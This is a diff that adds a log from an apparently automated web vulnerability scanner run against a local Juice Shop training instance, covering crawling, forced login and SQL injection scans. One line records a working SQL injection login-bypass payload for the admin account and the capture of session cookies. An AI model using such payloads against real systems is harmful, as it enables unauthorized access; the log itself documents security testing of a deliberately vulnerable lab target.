@@ -1,0 +1,114 @@
+13:47:23 [INFO] ============================================================
+13:47:23 [INFO] [PHASE 1] CHECKING TARGET REACHABILITY
+13:47:23 [INFO] ============================================================
+13:47:23 [INFO] 🔍 Testing connectivity to http://localhost:4040/...
+13:47:23 [INFO] ✅ Target is reachable! (Status: 200)
+13:47:23 [INFO] [+] Starting Public Discovery...
+13:47:23 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/
+13:47:25 [INFO]   [..] Processing: http://localhost:4040 (Depth: 0)
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/assets/i18n/en.json
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-version
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/admin/application-configuration
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/languages
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/api/Quantitys/
+13:47:26 [INFO]     [+] Target Saved: GET http://localhost:4040/rest/products/search?q=
+13:47:30 [INFO]     [..] Executing behavioral exploration...
+13:47:48 [INFO] ============================================================
+13:47:48 [INFO] [PHASE 2] AUTHENTICATION / FORCED LOGIN
+13:47:48 [INFO] ============================================================
+13:47:49 [INFO] 🌐 Loading target page: http://localhost:4040/
+13:47:52 [INFO] ✅ Page loaded successfully
+13:47:52 [INFO] 🕵️ No login form on landing page, searching for entry...
+13:47:56 [INFO] ✅ Found login form at http://localhost:4040/#/login
+13:47:56 [INFO] [Auth] Attempting Primary Login Method...
+13:47:56 [INFO] [Auth] 🛡️ Attempting Aggressive Entry at http://localhost:4040/#/login
+13:47:58 [INFO] ✅ SQLi Bypass Success with payload: admin@juice-sh.op'--
+13:47:58 [INFO] 🍪 Captured 4 session cookies
+13:47:58 [INFO] ✅ [Auth Success] Current URL: http://localhost:4040/#/search
+13:47:59 [INFO] [Crawler] 🍪 External cookies set. Total: 5
+13:47:59 [INFO] ============================================================
+13:47:59 [INFO] [PHASE 3] DEEP CRAWLING WITH SESSION...
+13:47:59 [INFO] Seed URL: http://localhost:4040/#/search
+13:47:59 [INFO] ============================================================
+13:47:59 [INFO] 🚀 Starting Async Crawl: http://localhost:4040/#/search
+13:48:00 [INFO] [Crawler] 🍪 Context initialized with 5 cookies
+13:48:00 [INFO]   [..] Processing: http://localhost:4040 (Depth: 0)
+13:48:05 [INFO]     [..] Executing behavioral exploration...
+13:48:20 [INFO]     [+] Target Saved: GET http://localhost:4040
+13:48:21 [INFO] ============================================================
+13:48:21 [INFO] [PHASE 4] ATTACK / EXPLOITATION
+13:48:21 [INFO] ============================================================
+13:48:21 [INFO] 📊 Deduplication: 16 -> 8 unique targets
+13:48:21 [INFO] [Requester] 🍪 5 cookies injected and session cleared.
+13:48:21 [INFO] [ScanEngine] 🔄 Global Session Sync Completed (Cookies & Auth Info)
+13:48:21 [INFO] 🔓 Running SQL Injection scans on 8 endpoints...
+13:48:21 [INFO] [1/8] SQLi Scan: GET http://localhost:4040/assets/i18n/en.json
+13:48:21 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:21 [INFO] [SQLi] Scan: GET http://localhost:4040/assets/i18n/en.json
+13:48:21 [INFO] [2/8] SQLi Scan: GET http://localhost:4040/rest/admin/application-version
+13:48:21 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:21 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/admin/application-version
+13:48:21 [INFO] [3/8] SQLi Scan: GET http://localhost:4040/rest/admin/application-configuration
+13:48:21 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:21 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/admin/application-configuration
+13:48:21 [INFO] [4/8] SQLi Scan: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+13:48:21 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:21 [INFO] [SQLi] Scan: GET http://localhost:4040/api/Challenges/?name=Score%20Board
+13:48:21 [INFO]     -> Testing Parameter: name
+13:48:27 [INFO] [5/8] SQLi Scan: GET http://localhost:4040/rest/languages
+13:48:27 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:27 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/languages
+13:48:27 [INFO] [6/8] SQLi Scan: GET http://localhost:4040/api/Quantitys/
+13:48:27 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:27 [INFO] [SQLi] Scan: GET http://localhost:4040/api/Quantitys/
+13:48:27 [INFO] [7/8] SQLi Scan: GET http://localhost:4040/rest/products/search?q=
+13:48:27 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:27 [INFO] [SQLi] Scan: GET http://localhost:4040/rest/products/search?q=
+13:48:27 [INFO]     -> Testing Parameter: q
+13:48:32 [INFO] [8/8] SQLi Scan: GET http://localhost:4040
+13:48:32 [INFO] [SQLi] 🍪 Session synced to scanner (Security: low)
+13:48:32 [INFO] [SQLi] Scan: GET http://localhost:4040
+13:48:32 [INFO]     -> Testing Parameter: mat_input_0
+13:48:34 [INFO]     -> Testing Parameter: mat_radio_0_input
+13:48:36 [INFO]     -> Testing Parameter: mat_radio_1_input
+13:48:38 [INFO]     -> Testing Parameter: mat_radio_2_input
+13:48:40 [INFO]     -> Testing Parameter: mat_radio_3_input
+13:48:42 [INFO]     -> Testing Parameter: mat_radio_4_input
+13:48:45 [INFO]     -> Testing Parameter: mat_radio_5_input
+13:48:47 [INFO]     -> Testing Parameter: mat_radio_6_input
+13:48:49 [INFO]     -> Testing Parameter: mat_radio_7_input
+13:48:51 [INFO]     -> Testing Parameter: mat_radio_8_input
+13:48:52 [INFO]     -> Testing Parameter: mat_radio_9_input
+13:48:54 [INFO]     -> Testing Parameter: mat_radio_10_input
+13:48:56 [INFO]     -> Testing Parameter: mat_radio_11_input
+13:48:58 [INFO]     -> Testing Parameter: mat_radio_12_input
+13:49:00 [INFO]     -> Testing Parameter: mat_radio_13_input
+13:49:02 [INFO]     -> Testing Parameter: mat_radio_14_input
+13:49:04 [INFO]     -> Testing Parameter: mat_radio_15_input
+13:49:05 [INFO]     -> Testing Parameter: mat_radio_16_input
+13:49:07 [INFO]     -> Testing Parameter: mat_radio_17_input
+13:49:09 [INFO]     -> Testing Parameter: mat_radio_18_input
+13:49:10 [INFO]     -> Testing Parameter: mat_radio_19_input
+13:49:12 [INFO]     -> Testing Parameter: mat_radio_20_input
+13:49:14 [INFO]     -> Testing Parameter: mat_radio_21_input
+13:49:16 [INFO]     -> Testing Parameter: mat_radio_22_input
+13:49:18 [INFO]     -> Testing Parameter: mat_radio_23_input
+13:49:20 [INFO]     -> Testing Parameter: mat_radio_24_input
+13:49:21 [INFO]     -> Testing Parameter: mat_radio_25_input
+13:49:23 [INFO]     -> Testing Parameter: mat_radio_26_input
+13:49:25 [INFO]     -> Testing Parameter: mat_radio_27_input
+13:49:27 [INFO]     -> Testing Parameter: mat_radio_28_input
+13:49:29 [INFO]     -> Testing Parameter: mat_radio_29_input
+13:49:31 [INFO]     -> Testing Parameter: mat_radio_30_input
+13:49:33 [INFO]     -> Testing Parameter: mat_radio_31_input
+13:49:34 [INFO]     -> Testing Parameter: mat_radio_32_input
+13:49:36 [INFO]     -> Testing Parameter: mat_radio_33_input
+13:49:38 [INFO]     -> Testing Parameter: mat_radio_34_input
+13:49:40 [INFO]     -> Testing Parameter: mat_radio_35_input
+13:49:42 [INFO]     -> Testing Parameter: mat_radio_36_input
+13:49:44 [INFO]     -> Testing Parameter: mat_radio_37_input
+13:49:45 [INFO]     -> Testing Parameter: mat_radio_38_input
+13:49:47 [INFO]     -> Testing Parameter: mat_radio_39_input
+13:49:49 [INFO]     -> Testing Parameter: mat_radio_40_input
+13:49:51 [INFO] ✅ Found 1 vulnerabilities!
